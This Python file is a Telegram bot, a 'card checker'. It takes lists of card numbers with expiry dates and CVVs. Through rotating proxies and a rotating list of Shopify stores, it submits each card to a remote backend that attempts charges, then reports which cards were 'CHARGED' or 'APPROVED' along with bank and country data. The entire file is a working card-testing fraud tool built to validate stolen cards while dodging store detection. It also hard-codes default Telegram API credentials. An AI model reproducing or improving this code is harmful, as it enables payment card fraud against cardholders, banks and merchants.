from datetime import datetime
import json
import os
import random
import re
import time
import asyncio
import aiofiles
import aiohttp
from telethon import Button, TelegramClient, events
from dotenv import load_dotenv

load_dotenv()

API_ID = int(os.getenv("API_ID", "21124241"))
API_HASH = os.getenv("API_HASH", "b7ddce3d3683f54be788fddae73fa468")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
RAILWAY_API_URL = os.getenv("RAILWAY_API_URL", "https://backend-vxo-production.up.railway.app/check")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PREMIUM_FILE = os.path.join(BASE_DIR, "premium.txt")
SITES_FILE = os.path.join(BASE_DIR, "sites.txt")
PROXY_FILE = os.path.join(BASE_DIR, "proxy.txt")

bot = TelegramClient("checker_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
bin_cache = {}

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    env_users = os.getenv("PREMIUM_USERS", "")
    if env_users:
        return [uid.strip() for uid in env_users.split(",") if uid.strip()]
    return get_file_lines(PREMIUM_FILE)

def load_sites(): return get_file_lines(SITES_FILE)
def load_proxies(): return get_file_lines(PROXY_FILE)
def is_premium(user_id): return str(user_id) in load_premium_users()

def extract_cc(text):
    pattern = r"(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})"
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = "20" + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def normalize_proxy(line):
    if not line or not line.strip():
        return None
    line = line.strip().strip('"').strip("'")
    for prefix in ["http://", "https://", "socks4://", "socks5://"]:
        if line.lower().startswith(prefix):
            line = line[len(prefix):]
    if "#" in line:
        line = line.split("#")[0].strip()
    if not line:
        return None
    if "@" in line and line.count("@") == 1:
        try:
            auth, endpoint = line.split("@")
            user, pwd = auth.split(":", 1) if ":" in auth else (auth, "")
            if ":" in endpoint:
                ip, port = endpoint.rsplit(":", 1)
                return f"{ip}:{port}:{user}:{pwd}" if user and pwd else f"{ip}:{port}"
        except:
            pass
    return line

async def get_bin_info(card_number):
    bin_number = card_number[:6]
    if bin_number in bin_cache:
        return bin_cache[bin_number]
        
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200:
                    data = ("Unknown", "-", "-", "Unknown", "Unknown", "")
                else:
                    d = json.loads(await res.text())
                    data = (
                        d.get("brand", "-"),
                        d.get("type", "-"),
                        d.get("level", "-"),
                        d.get("bank", "-"),
                        d.get("country_name", "-"),
                        d.get("country_flag", ""),
                    )
                bin_cache[bin_number] = data
                return data
    except Exception:
        return "Unknown", "-", "-", "Unknown", "Unknown", ""

async def verify_card_with_railway(card, site, proxy):
    try:
        clean_proxy = proxy.strip() if proxy else ""
        # Payload matching your backend specifications (POST /check)
        payload = {
            "card": card,
            "shop_url": site,
            "proxy": clean_proxy,
            "low": True
        }
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(RAILWAY_API_URL, json=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    # Parsing backend schema keys
                    response_msg = data.get("Response", "DECLINED")
                    price = data.get("Price", "-")
                    gate = data.get("Gate", "Shopify")
                    charged_flag = data.get("Charged", False)
                    
                    is_charged = str(charged_flag).lower() == "true" or "charged" in str(response_msg).lower()
                    
                    if is_charged:
                        status = "CHARGED"
                    elif "approved" in str(response_msg).lower() or "success" in str(response_msg).lower():
                        status = "APPROVED"
                    elif "error" in str(response_msg).lower():
                        status = "ERROR"
                    else:
                        status = "DECLINED"

                    return {
                        "status": status,
                        "message": response_msg,
                        "card": card,
                        "site": site,
                        "gateway": gate,
                        "price": price,
                    }
                else:
                    return {"status": "ERROR", "message": f"API_HTTP_{resp.status}", "card": card, "site": site, "gateway": "Shopify", "price": "-"}
    except asyncio.TimeoutError:
        return {"status": "ERROR", "message": "PROXY_TIMEOUT", "card": card, "site": site, "gateway": "Shopify", "price": "-"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e), "card": card, "site": site, "gateway": "Shopify", "price": "-"}

# --- TELEGRAM COMMANDS ---

@bot.on(events.NewMessage(incoming=True, pattern=r"^/start"))
async def start_cmd(event):
    if not is_premium(event.sender_id):
        await event.reply("❌ <b>Access Denied. Premium authorization required.</b>", parse_mode="html")
        return
    me = await bot.get_me()
    await event.reply(
        f"<b>⚡💳 AUTOSOPI ULTIMATE CHECKER 💳⚡</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"• <code>/cc card|mm|yy|cvv</code> - Check single card\n"
        f"• <code>/chk</code> - Reply to a .txt card list file for mass check\n"
        f"• <code>/site</code> - Check loaded target stores\n"
        f"• <code>/proxy</code> - View proxy stats\n"
        f"• <code>/addproxy</code> - Reply with text or .txt to add proxies\n"
        f"• <code>/chkproxy</code> - Test and clean dead proxies\n"
        f"• <code>/clearproxy</code> - Wipe all saved proxies\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"🔮 <b>Bot ➛</b> @{me.username}",
        parse_mode="html",
    )

@bot.on(events.NewMessage(incoming=True, pattern=r"^/cc\s+"))
async def single_cc_cmd(event):
    if not is_premium(event.sender_id):
        return
    text = event.message.text.replace("/cc", "").strip()
    cards = extract_cc(text)
    if not cards:
        await event.reply("❌ Incorrect format. Example: <code>/cc 4532...|09|2028|123</code>", parse_mode="html")
        return
    
    card = cards[0]
    msg = await event.reply(f"<b>⚡ Running Autosopi Real Check...</b>\n<code>{card}</code>", parse_mode="html")
    
    sites, proxies = load_sites(), load_proxies()
    chosen_site = random.choice(sites) if sites else "N/A"
    if chosen_site and not chosen_site.startswith("http"):
        chosen_site = "https://" + chosen_site
        
    chosen_proxy = random.choice(proxies) if proxies else ""
    brand, bin_type, level, bank, country, flag = await get_bin_info(card[:6])
    res = await verify_card_with_railway(card, chosen_site, chosen_proxy)
    
    status_type = res["status"]
    if status_type == "CHARGED":
        status_box = "💎 CHARGED"
    elif status_type == "APPROVED":
        status_box = "🟢 APPROVED"
    else:
        status_box = "⚠️ DECLINED / ERROR"

    output_text = (
        f"<b>────────────────────</b>\n"
        f"<b>| {status_box}</b>\n"
        f"<b>────────────────────</b>\n\n"
        f"<b>Card ➛</b> <code>{res['card']}</code>\n"
        f"<b>Gateway ➛</b> {res.get('gateway', 'Shopify')}\n"
        f"<b>Amount ➛</b> {res.get('price', '$1.00')}\n"
        f"<b>Store ➛</b> <code>{res.get('site', 'N/A')}</code>\n"
        f"<b>Response ➛</b> {res['message']}\n"
        f"<b>BIN ➛</b> {brand} - {bin_type}\n"
        f"<b>Bank ➛</b> {bank}\n"
        f"<b>Country ➛</b> {country} {flag}"
    )
    await msg.edit(output_text, parse_mode="html")

@bot.on(events.NewMessage(incoming=True, pattern=r"^/site$"))
async def site_status_cmd(event):
    if not is_premium(event.sender_id):
        return
    sites = load_sites()
    await event.reply(f"🌐 Loaded active check stores: <b>{len(sites)}</b> target sites ready.", parse_mode="html")

@bot.on(events.NewMessage(incoming=True, pattern=r"^/proxy$"))
async def proxy_cmd(event):
    if not is_premium(event.sender_id):
        return
    proxies = load_proxies()
    await event.reply(f"🔄 Loaded active proxy nodes: <b>{len(proxies)}</b> nodes ready.", parse_mode="html")

@bot.on(events.NewMessage(incoming=True, pattern=r"^/clearproxy$"))
async def clear_proxy_cmd(event):
    if not is_premium(event.sender_id):
        return
    try:
        with open(PROXY_FILE, "w", encoding="utf-8") as f:
            f.write("")
        await event.reply("🗑️ Successfully cleared all proxies from <code>proxy.txt</code>.", parse_mode="html")
    except Exception as e:
        await event.reply(f"❌ Error clearing proxies: {e}")

@bot.on(events.NewMessage(incoming=True, pattern=r"^/addproxy"))
async def add_proxy_cmd(event):
    if not is_premium(event.sender_id):
        return
    
    raw_text = event.message.text.replace("/addproxy", "").strip()
    reply = await event.get_reply_message()
    
    lines_to_add = []
    if raw_text:
        lines_to_add.extend(raw_text.splitlines())
    
    if reply and reply.file and reply.file.name.endswith(".txt"):
        filepath = await reply.download_media()
        async with aiofiles.open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = await f.read()
            lines_to_add.extend(content.splitlines())
        try: os.remove(filepath)
        except: pass

    if not lines_to_add:
        await event.reply("❌ Please provide proxies directly in the command or reply to a text file containing proxies.", parse_mode="html")
        return

    added_count = 0
    existing_proxies = set(load_proxies())
    
    async with aiofiles.open(PROXY_FILE, "a", encoding="utf-8") as f:
        for line in lines_to_add:
            normalized = normalize_proxy(line)
            if normalized and normalized not in existing_proxies:
                await f.write(normalized + "\n")
                existing_proxies.add(normalized)
                added_count += 1

    total_now = len(load_proxies())
    await event.reply(f"✅ Successfully added <b>{added_count}</b> new valid proxies! Total active: <b>{total_now}</b>", parse_mode="html")

@bot.on(events.NewMessage(incoming=True, pattern=r"^/chkproxy$"))
async def check_proxy_cmd(event):
    if not is_premium(event.sender_id):
        return
    
    proxies = load_proxies()
    if not proxies:
        await event.reply("❌ No proxies found in <code>proxy.txt</code> to test.", parse_mode="html")
        return

    status_msg = await event.reply(f"🔍 Testing <b>{len(proxies)}</b> proxies for live connectivity...")
    
    valid_proxies = []
    test_url = "https://httpbin.org/ip"

    async def test_single_proxy(proxy_str):
        parts = proxy_str.split(':')
        proxy_url = None
        auth = None
        
        if len(parts) >= 4:
            ip, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
            proxy_url = f"http://{ip}:{port}"
            auth = aiohttp.BasicAuth(user, pwd)
        else:
            proxy_url = f"http://{proxy_str}"

        try:
            timeout = aiohttp.ClientTimeout(total=7)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(test_url, proxy=proxy_url, proxy_auth=auth) as resp:
                    if resp.status == 200:
                        return proxy_str
        except:
            pass
        return None

    tasks = [test_single_proxy(p) for p in proxies]
    results = await asyncio.gather(*tasks)
    
    for r in results:
        if r:
            valid_proxies.append(r)

    async with aiofiles.open(PROXY_FILE, "w", encoding="utf-8") as f:
        for vp in valid_proxies:
            await f.write(vp + "\n")

    await status_msg.edit(
        f"🌐 <b>Proxy Health Check Complete!</b>\n\n"
        f"• Tested: {len(proxies)}\n"
        f"• Working: <b>{len(valid_proxies)}</b>\n"
        f"• Dead removed: <b>{len(proxies) - len(valid_proxies)}</b>",
        parse_mode="html"
    )

@bot.on(events.NewMessage(incoming=True, pattern=r"^/chk$"))
async def mass_chk_cmd(event):
    user_id = event.sender_id
    if not is_premium(user_id) or not event.reply_to_msg_id:
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith(".txt"):
        await event.reply("❌ Please reply to a valid `.txt` file.")
        return
        
    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply("❌ Missing `sites.txt` or `proxy.txt` files.", parse_mode="html")
        return

    status_msg = await event.reply("🫆 Downloading card list and initializing anti-repeat rotation...")
    filepath = await reply.download_media()
    
    async with aiofiles.open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        cards = extract_cc(await f.read())
    try: os.remove(filepath)
    except: pass

    if not cards:
        await status_msg.edit("😡 No valid card patterns found.")
        return

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {"paused": False}
    
    results = {
        "charged": [], "approved": [], "dead": [], 
        "total": len(cards), "checked": 0, "start_time": time.time(),
        "latest_card": "None", "latest_status": "Starting...", "latest_response": "Initializing..."
    }
    
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)
    
    last_ui_update = [time.time()]
    MAX_CONCURRENT_CHECKS = 1  
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)

    shuffled_sites = list(sites)
    random.shuffle(shuffled_sites)
    site_history_queue = []

    async def get_next_unique_site():
        nonlocal shuffled_sites
        if not shuffled_sites:
            shuffled_sites = list(sites)
            random.shuffle(shuffled_sites)
            
        chosen = shuffled_sites.pop(0)
        site_history_queue.append(chosen)
        
        max_buffer = min(50, len(sites) - 1)
        if len(site_history_queue) > max_buffer:
            old_site = site_history_queue.pop(0)
            shuffled_sites.append(old_site)
            
        return chosen

    async def worker_task():
        while not queue.empty() and session_key in active_sessions:
            if active_sessions[session_key].get("paused", False):
                await asyncio.sleep(1)
                continue
            try: card = queue.get_nowait()
            except: break
            
            raw_site = await get_next_unique_site()
            chosen_site = raw_site if raw_site.startswith("http") else "https://" + raw_site
            chosen_proxy = random.choice(proxies)
            
            brand, bin_type, level, bank, country, flag = await get_bin_info(card[:6])
            
            async with semaphore:
                res = await verify_card_with_railway(card, chosen_site, chosen_proxy)
            
            results["checked"] += 1
            status = res["status"]
            results["latest_card"] = card
            results["latest_response"] = res['message']
            
            if status == "CHARGED":
                results["charged"].append(res)
                status_box = "💎 CHARGED"
                results["latest_status"] = status_box
                live_alert = (
                    f"<b>────────────────────</b>\n"
                    f"<b>| {status_box}</b>\n"
                    f"<b>────────────────────</b>\n\n"
                    f"<b>Card ➛</b> <code>{res['card']}</code>\n"
                    f"<b>Gateway ➛</b> {res.get('gateway', 'Shopify')}\n"
                    f"<b>Amount ➛</b> {res.get('price', '$1.00')}\n"
                    f"<b>Store ➛</b> <code>{res.get('site', 'N/A')}</code>\n"
                    f"<b>Response ➛</b> {res['message']}\n"
                    f"<b>BIN ➛</b> {brand} - {bin_type}\n"
                    f"<b>Bank ➛</b> {bank}\n"
                    f"<b>Country ➛</b> {country} {flag}"
                )
                try: await bot.send_message(user_id, live_alert, parse_mode="html")
                except: pass
                
            elif status == "APPROVED":
                results["approved"].append(res)
                status_box = "🟢 APPROVED"
                results["latest_status"] = status_box
                live_alert = (
                    f"<b>────────────────────</b>\n"
                    f"<b>| {status_box}</b>\n"
                    f"<b>────────────────────</b>\n\n"
                    f"<b>Card ➛</b> <code>{res['card']}</code>\n"
                    f"<b>Gateway ➛</b> {res.get('gateway', 'Shopify')}\n"
                    f"<b>Amount ➛</b> {res.get('price', '$1.00')}\n"
                    f"<b>Store ➛</b> <code>{res.get('site', 'N/A')}</code>\n"
                    f"<b>Response ➛</b> {res['message']}\n"
                    f"<b>BIN ➛</b> {brand} - {bin_type}\n"
                    f"<b>Bank ➛</b> {bank}\n"
                    f"<b>Country ➛</b> {country} {flag}"
                )
                try: await bot.send_message(user_id, live_alert, parse_mode="html")
                except: pass
            else:
                results["dead"].append(res)
                results["latest_status"] = "⚠️ Declined / Error"
            
            queue.task_done()
            await asyncio.sleep(0.3)

            if time.time() - last_ui_update[0] >= 1.0:
                last_ui_update[0] = time.time()
                if session_key in active_sessions:
                    try:
                        elapsed = int(time.time() - results["start_time"])
                        hrs, rem = divmod(elapsed, 3600)
                        mins, secs = divmod(rem, 60)
                        
                        prog = (
                            f"<b>⚡ AUTOSOPI LIVE CHECK STREAM ⚡</b>\n\n"
                            f"<b>Checked ➛</b> {results['checked']}/{results['total']}\n"
                            f"💎 <b>Charged ➛</b> {len(results['charged'])}\n"
                            f"🟢 <b>Approved ➛</b> {len(results['approved'])}\n"
                            f"⚠️ <b>Declines ➛</b> {len(results['dead'])}\n\n"
                            f"<b>Latest Card ➛</b> <code>{results['latest_card']}</code>\n"
                            f"<b>Status ➛</b> {results['latest_status']}\n"
                            f"<b>Response ➛</b> <i>{results['latest_response']}</i>\n\n"
                            f"<b>Time ➛</b> {hrs:02d}:{mins:02d}:{secs:02d}"
                        )
                        btns = [[Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")], [Button.inline("🛑 Stop", b"stop")]]
                        await bot.edit_message(user_id, status_msg.id, prog, buttons=btns, parse_mode="html")
                    except: pass

    workers = [asyncio.create_task(worker_task()) for _ in range(MAX_CONCURRENT_CHECKS)]
    await asyncio.gather(*workers, return_exceptions=True)

    if session_key in active_sessions: del active_sessions[session_key]
    try: await status_msg.delete()
    except: pass

    total_duration = int(time.time() - results["start_time"])
    m_f, s_f = divmod(total_duration, 60)
    h_f, m_f = divmod(m_f, 60)
    me = await bot.get_me()
    
    final_report = (
        f"<b>🔮 AUTOSOPI SESSION COMPLETE</b>\n\n"
        f"💎 <b>Charged ➛</b> {len(results['charged'])}\n"
        f"🟢 <b>Approved ➛</b> {len(results['approved'])}\n"
        f"⚠️ <b>Declined/Error ➛</b> {len(results['dead'])}\n"
        f"<b>Total ➛</b> {results['total']}\n"
        f"<b>Time ➛</b> {h_f:02d}h {s_f:02d}s\n"
        f"🔮 <b>Bot ➛</b> @{me.username}"
    )
    await bot.send_message(user_id, final_report, parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_session(event):
    for s_id in active_sessions:
        if str(event.sender_id) in s_id: active_sessions[s_id]["paused"] = True
        await event.answer("Paused!")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_session(event):
    for s_id in active_sessions:
        if str(event.sender_id) in s_id: active_sessions[s_id]["paused"] = False
        await event.answer("Resumed!")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_session(event):
    for s_id in list(active_sessions.keys()):
        if str(event.sender_id) in s_id: del active_sessions[s_id]
        await event.answer("Stopped.")

print("✅ Bot running with strict backend mapping!")
bot.run_until_disconnected()
